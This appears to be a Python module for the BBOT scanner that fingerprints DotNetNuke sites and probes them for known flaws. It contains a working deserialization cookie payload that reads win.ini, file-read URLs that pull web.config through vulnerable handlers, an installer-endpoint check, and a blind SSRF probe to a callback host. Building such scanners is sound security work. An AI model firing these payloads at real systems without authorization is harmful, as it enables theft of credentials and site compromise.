from bbot.errors import InteractshError
from bbot.modules.base import BaseModule


class dotnetnuke(BaseModule):
    DNN_signatures_body = [
        "<!-- by DotNetNuke Corporation",
        "<!-- DNN Platform",
        "/js/dnncore.js",
        'content=",DotNetNuke,DNN',
        "dnn_ContentPane",
        'class="DnnModule"',
        "/Install/InstallWizard.aspx",
    ]
    DNN_signatures_header = ["DNNOutputCache", "X-Compressed-By: DotNetNuke"]
    exploit_probe = {
        "DNNPersonalization": r'<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'
    }

    watched_events = ["HTTP_RESPONSE"]
    produced_events = ["VULNERABILITY", "TECHNOLOGY"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {
        "description": "Scan for critical DotNetNuke (DNN) vulnerabilities",
        "created_date": "2023-11-21",
        "author": "@liquidsec",
    }

    async def setup(self):
        self.event_dict = {}
        self.interactsh_subdomain_tags = {}
        self.interactsh_instance = None

        if self.scan.config.get("interactsh_disable", False) is False:
            try:
                self.interactsh_instance = self.helpers.interactsh()
                self.interactsh_domain = await self.interactsh_instance.register(callback=self.interactsh_callback)
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

        return True

    async def interactsh_callback(self, r):
        full_id = r.get("full-id", None)
        if full_id:
            if "." in full_id:
                event = self.interactsh_subdomain_tags.get(full_id.split(".")[0])
                if not event:
                    return
                url = event.data["url"]
                description = (
                    "DotNetNuke Blind SSRF (CVE-2017-0929) was confirmed by an out-of-band interaction. "
                    "The DNN image handler can be abused to make the server request attacker-controlled or internal URLs, which may expose internal services, cloud metadata, or other network-restricted resources. "
                    "SSRF means the attacker does not connect to the internal target directly; instead, the vulnerable web server makes the request on the attacker's behalf. "
                    "Because the request originates from inside the hosting environment, it may reach services that are blocked from the internet. "
                    "The affected DNN component should be patched or disabled, outbound requests should be restricted, and cloud metadata or internal admin endpoints should not be reachable from the web application."
                )
                await self.emit_event(
                    {
                        "severity": "MEDIUM",
                        "host": str(event.host),
                        "url": url,
                        "description": description,
                    },
                    "VULNERABILITY",
                    event,
                    context=f"{{module}} scanned {url} and found medium {{event.type}}: {description}",
                )
            else:
                # this is likely caused by something trying to resolve the base domain first and can be ignored
                self.debug("skipping result because subdomain tag was missing")

    async def handle_event(self, event):
        detected = False
        raw_headers = event.data.get("raw_header", None)

        if raw_headers:
            for header_signature in self.DNN_signatures_header:
                if header_signature in raw_headers:
                    url = event.data["url"]
                    await self.emit_event(
                        {"technology": "DotNetNuke", "url": url, "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                        context=f"{{module}} scanned {url} and found {{event.type}}: DotNetNuke",
                    )
                    detected = True
                    break
        resp_body = event.data.get("body", None)
        if resp_body:
            for body_signature in self.DNN_signatures_body:
                if body_signature in resp_body:
                    await self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                        context=f"{{module}} scanned {event.data['url']} and found {{event.type}}: DotNetNuke",
                    )
                    detected = True
                    break

        if detected is True:
            # DNNPersonalization Deserialization Detection
            for probe_url in [f"{event.data['url']}/__", f"{event.data['url']}/", f"{event.data['url']}"]:
                result = await self.helpers.request(probe_url, cookies=self.exploit_probe)
                if result:
                    if "for 16-bit app support" in result.text and "[extensions]" in result.text:
                        description = (
                            "DotNetNuke personalization cookie deserialization was confirmed by reading server-side Windows configuration content. "
                            "A crafted personalization cookie can make the application deserialize attacker-controlled data, which can lead to arbitrary file access or remote code execution depending on the DNN version and server configuration. "
                            "Deserialization is dangerous because the server rebuilds application objects from data supplied by the client. Vulnerable frameworks may treat that data as instructions and perform unintended actions. "
                            "This should be handled as a critical application compromise risk: patch DNN, rotate machine keys or secrets if exposed, review logs for crafted cookie activity, and confirm that sensitive local files cannot be read through the web tier."
                        )
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": description,
                                "host": str(event.host),
                                "url": probe_url,
                            },
                            "VULNERABILITY",
                            event,
                            context=f"{{module}} scanned {probe_url} and found critical {{event.type}}: {description}",
                        )

            if "endpoint" not in event.tags:
                # NewsArticlesSlider ImageHandler.ashx File Read
                result = await self.helpers.request(
                    f"{event.data['url']}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config"
                )
                if result:
                    if "<configuration>" in result.text:
                        description = (
                            "The DotNetNuke dnnUI_NewsArticlesSlider module allows arbitrary file reads through ImageHandler.ashx. "
                            "An unauthenticated attacker can request sensitive local files such as web.config, which may expose database credentials, machine keys, or other secrets needed to compromise the application. "
                            "For a non-specialist, this means a public URL may be able to read files from the server that should only be available to the application itself. "
                            "If configuration files are exposed, attackers can often recover connection strings, encryption keys, debug settings, and internal paths. "
                            "Patch or remove the vulnerable module, block direct access to the handler, and rotate any secrets that may have been readable."
                        )
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": description,
                                "host": str(event.host),
                                "url": f"{event.data['url']}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx",
                            },
                            "VULNERABILITY",
                            event,
                            context=f"{{module}} scanned {event.data['url']} and found critical {{event.type}}: {description}",
                        )

                # DNNArticle GetCSS.ashx File Read
                result = await self.helpers.request(
                    f"{event.data['url']}/DesktopModules/DNNArticle/getcss.ashx?CP=%2fweb.config&smid=512&portalid=3"
                )
                if result:
                    if "<configuration>" in result.text:
                        description = (
                            "The DotNetNuke DNNArticle module allows arbitrary file reads through GetCSS.ashx. "
                            "An attacker can request sensitive local files such as web.config, potentially exposing credentials, encryption keys, and configuration details that enable deeper compromise. "
                            "This is a file disclosure issue: the attacker is not just viewing normal web content, but asking the server to return files from the application or operating system. "
                            "The exposed data can be used to connect to databases, forge protected values, understand deployment paths, or chain into remote code execution. "
                            "The module should be patched or disabled immediately, and any exposed credentials or machine keys should be rotated."
                        )
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": description,
                                "host": str(event.host),
                                "url": f"{event.data['url']}/Desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config",
                            },
                            "VULNERABILITY",
                            event,
                            context=f"{{module}} scanned {event.data['url']} and found critical {{event.type}}: {description}",
                        )

                # InstallWizard SuperUser Privilege Escalation
                result = await self.helpers.request(f"{event.data['url']}/Install/InstallWizard.aspx")
                if result:
                    if result.status_code == 200:
                        result_confirm = await self.helpers.request(
                            f"{event.data['url']}/Install/InstallWizard.aspx?__viewstate=1"
                        )
                        if result_confirm.status_code == 500:
                            description = (
                                "The DotNetNuke InstallWizard endpoint is exposed and behaves like a vulnerable installer flow. "
                                "If exploitable, an attacker may be able to abuse the installer to create or elevate a SuperUser account, leading to full administrative control of the DNN site. "
                                "Installer endpoints are meant for initial setup or controlled maintenance, not for public access after the site is deployed. "
                                "When left exposed, they may allow configuration changes, database initialization actions, or privilege changes that bypass normal authentication. "
                                "The endpoint should be removed or blocked, the site should be patched, and administrators should review user accounts, configuration changes, and logs for signs of unauthorized setup activity."
                            )
                            await self.emit_event(
                                {
                                    "severity": "CRITICAL",
                                    "description": description,
                                    "host": str(event.host),
                                    "url": f"{event.data['url']}/Install/InstallWizard.aspx",
                                },
                                "VULNERABILITY",
                                event,
                                context=f"{{module}} scanned {event.data['url']} and found critical {{event.type}}: {description}",
                            )
                            return

                # DNNImageHandler.ashx Blind SSRF
                self.event_dict[event.data["url"]] = event
                if self.interactsh_instance:
                    subdomain_tag = self.helpers.rand_string(4, digits=False)
                    self.interactsh_subdomain_tags[subdomain_tag] = event

                    await self.helpers.request(
                        f"{event.data['url']}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{self.interactsh_domain}"
                    )
                else:
                    self.debug(
                        "Aborting DNNImageHandler SSRF check due to interactsh global disable or interactsh setup failure"
                    )
                    return None

    async def cleanup(self):
        if self.interactsh_instance:
            try:
                await self.interactsh_instance.deregister()
                self.debug(
                    f"successfully deregistered interactsh session with correlation_id {self.interactsh_instance.correlation_id}"
                )
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

    async def finish(self):
        if self.interactsh_instance:
            await self.helpers.sleep(5)
            try:
                for r in await self.interactsh_instance.poll():
                    await self.interactsh_callback(r)
            except InteractshError as e:
                self.debug(f"Error in interact.sh: {e}")
